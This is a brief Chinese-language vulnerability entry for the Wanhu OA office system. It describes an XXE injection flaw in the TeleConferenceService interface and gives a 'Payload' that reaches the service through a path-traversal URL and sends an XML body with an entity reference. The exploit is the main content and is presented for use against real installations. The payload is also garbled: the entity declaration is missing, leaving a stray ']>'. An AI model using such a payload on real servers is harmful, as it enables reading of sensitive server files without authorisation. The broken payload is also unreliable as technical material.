**漏洞描述：**

万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息。

**影响版本：**

万户OA

**Payload：**

```html
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService

<?xml version="1.0" encoding="UTF-8" ?>
]>
<value>&xxe;</value>
```

---
